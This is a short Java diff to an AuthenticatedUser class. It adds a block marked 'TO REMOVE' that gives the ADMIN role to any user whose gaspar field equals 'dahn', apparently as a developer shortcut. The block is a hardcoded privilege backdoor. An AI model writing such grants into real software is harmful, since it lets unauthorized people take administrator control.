@@ -38,6 +38,11 @@ public class AuthenticatedUser extends User {
 
         // Add role
         this.addRole(UserRole.USER);
+
+        // TO REMOVE
+        if(gaspar.equals("dahn")){
+            this.addRole(UserRole.ADMIN);
+        }
     }
 
     // TODO: Add a method to add/remove one Association to assos_id, same for chats and events
